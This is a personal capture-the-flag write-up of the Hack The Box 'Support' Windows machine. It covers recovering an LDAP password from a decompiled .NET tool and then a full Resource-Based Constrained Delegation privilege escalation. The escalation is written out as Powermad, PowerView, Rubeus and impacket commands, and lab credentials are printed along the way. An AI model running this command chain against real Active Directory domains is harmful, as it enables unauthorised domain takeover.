+++
title = 'Support'
description = 'Easy Windows'
writeup = true
hideMeta = true
+++

nmap scan
![Support (Easy Windows).png](Support%20%28Easy%20Windows%29.png)

- 53 - DNS
- 88 - MS Windows Kerberos
- 135 - MS Windows RPC
- 139 - MS Windows netbios-ssn
- 389 - MS Windows Active Directory LDAP
- 445 - ?
- 464 - ?
- 593 - MS Windows RPC over HTTP 1.0
- 636 - ?
- 3268 - MS Windows Active Directory LDAP
- 3269 - ?
- 5985 - MS HTTPAPI httpd 2.0 (SSDP/UPnP)
- 9389 - .NET Message Framing
- 49664 - MS Windows RPC
- 49667 - MS Windows RPC
- 49678 - MS Windows RPC over HTTP 1.0
- 49683 - MS Windows RPC
- 49707 - MS Windows RPC

running `enum4linux` on the machine because we have netbios port
![Support (Easy Windows)-1.png](Support%20%28Easy%20Windows%29-1.png)

domain name: `SUPPORT`
domain SID: `S-1-5-21-1677581083-3380853377-188903654`

most of the other information we are getting an ACCESS DENIED

looks like we need to find some credentials

the following shares are present on the machine (using smbclient -L)
![Support (Easy Windows)-2.png](Support%20%28Easy%20Windows%29-2.png)

support-tools is not a default share

![Support (Easy Windows)-3.png](Support%20%28Easy%20Windows%29-3.png)

![Support (Easy Windows)-4.png](Support%20%28Easy%20Windows%29-4.png)

![Support (Easy Windows)-5.png](Support%20%28Easy%20Windows%29-5.png)

the binary file is a .NET executable, as we are on linux there is 2 ways to proceed. Decompile the file or use `wine` to attempt to run it

ILSpy https://github.com/icsharpcode/AvaloniaILSpy/releases

Using ILSpy to look at the binary (decompiled)

![Support (Easy Windows)-6.png](Support%20%28Easy%20Windows%29-6.png)

exploring it finds the password encoded - and also the algorithm to decode it

![Support (Easy Windows)-7.png](Support%20%28Easy%20Windows%29-7.png)

`0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`

![Support (Easy Windows)-8.png](Support%20%28Easy%20Windows%29-8.png)

`armando` is the key

![Support (Easy Windows)-10.png](Support%20%28Easy%20Windows%29-10.png)

![Support (Easy Windows)-9.png](Support%20%28Easy%20Windows%29-9.png)

The executable does an LDAP query and attempts to connect to a remote LDAP server and obtain user information

add support.htb to hosts file

![Support (Easy Windows)-11.png](Support%20%28Easy%20Windows%29-11.png)

with the password that we have now `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`, we can attempt to authenticate to the LDAP server

from this query code, we can see that the username is `ldap`

![Support (Easy Windows)-12.png](Support%20%28Easy%20Windows%29-12.png)

```bash
ldapsearch -x -H ldap://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb"
```

![Support (Easy Windows)-13.png](Support%20%28Easy%20Windows%29-13.png)

![Support (Easy Windows)-14.png](Support%20%28Easy%20Windows%29-14.png)

![Support (Easy Windows)-15.png](Support%20%28Easy%20Windows%29-15.png)

info: section looks like it contains a password for `support` - `Ironside47pleasure40Watchful`

We also see that `support` is part of the `Remote Management Users` Group

![Support (Easy Windows)-16.png](Support%20%28Easy%20Windows%29-16.png)

WinRM is running on the box - port 5985 running http in nmap scan

![Support (Easy Windows)-17.png](Support%20%28Easy%20Windows%29-17.png)

## Privilege Escalation

Looked around a bit - but there isn't much here and I don't really know what I'm doing - don't understand enough about how the windows OS works and Active Directory to try do this priv esc

Will try finish the box with someone's help at the office and move onto doing a course or something to really learn Windows priv esc and Active Directory attacks

I'm back.

Considering we've compromised a domain user, let's run bloodhound
```bash
bloodhound-python -d support.htb -u support@support.htb -p Ironside47pleasure40Watchful -gc support.htb -c all -ns 10.129.230.181
```

![Support (Easy Windows)-18.png](Support%20%28Easy%20Windows%29-18.png)

import the json files into bloodhound for viewing
![Support (Easy Windows)-19.png](Support%20%28Easy%20Windows%29-19.png)

looking to see if there is a path to administrator, we see there is:

![Support (Easy Windows)-20.png](Support%20%28Easy%20Windows%29-20.png)

and this is because support@support.htb is part of Shared Support Accounts group which has has GenericAll privileges on DC.SUPPORT.HTB - which is the domain controller and obviously has control of everything including Administrator

![Support (Easy Windows)-21.png](Support%20%28Easy%20Windows%29-21.png)
![Support (Easy Windows)-22.png](Support%20%28Easy%20Windows%29-22.png)

Essentially bloodhound mentions that we can perform a Resource Based Constrained Delegation attack to escalate privileges

# Resource-Based Constrained Delegation attack

In a nutshell, through a Resource Based Constrained Delegation attack we can add a computer under our control to the domain; let's call this computer $FAKE-COMP01 , and configure the Domain Controller (DC) to allow $FAKE-COMP01 to act on behalf of it. Then, by acting on behalf of the DC we can request Kerberos tickets for $FAKE-COMP01 , with the ability to impersonate a highly privileged user on the Domain, such as the Administrator . After the Kerberos tickets are generated, we can Pass the Ticket (PtT) and authenticate as this privileged user, giving us control over the entire domain. The attack relies on three prerequisites: 
- We need a shell or code execution as a domain user that belongs to the Authenticated Users group. By default any member of this group can add up to 10 computers to the domain. 
- The ms-ds-machineaccountquota attribute needs to be higher than 0. This attribute controls the amount of computers that authenticated domain users can add to the domain. 
- Our current user or a group that our user is a member of, needs to have WRITE privileges ( GenericAll , WriteDACL ) over a domain joined computer (in this case the Domain Controller). 
From our previous enumeration we know that the support user is indeed a member of the Authenticated Users group as well as the Shared Support Accounts group. We also know that the Shared Support Accounts group has GenericAll privileges over the Domain Controller ( dc.support.htb ).


```bash
# Get dependencies for attack
# Powermad
git clone https://github.com/Kevin-Robertson/Powermad.git
cp ~/tools/Powermad/Powermad.ps1 ./Powermad.ps1
# PowerView
sudo apt install powersploit
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ./PowerView.ps1
# Rubeus.exe
cp /usr/share/windows-resources/rubeus/Rubeus.exe ./Rubeus.exe

# Make sure we are able to add machines - needs to be higher than 0
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota

# With evil-winrm
upload Powermad.ps1
upload PowerView.ps1
upload Rubeus.exe

# Import powershell modules
. ./Powermad.ps1
. ./PowerView.ps1

# Following steps on bloodhound
# Create new machine account
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
# Get SID of the account we just created
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
# Build a generic ACE with our added machine account SID as the principal, and get the binary bytes for the new ACE
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
# Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
# User Rubeus.exe to hash the plaintext password into its RC4_HMAC form
./Rubeus.exe hash /password:Summer2018!
# And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
./Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

# Copy the last ticket value and save it to ticket.kirbi.b64 in local kali
vim ticket.kirbi.b64 # remember to remove spaces

base64 -d ticket.kirbi.b64 > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache

KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
```

![Support (Easy Windows)-23.png](Support%20%28Easy%20Windows%29-23.png)

![Support (Easy Windows)-24.png](Support%20%28Easy%20Windows%29-24.png)
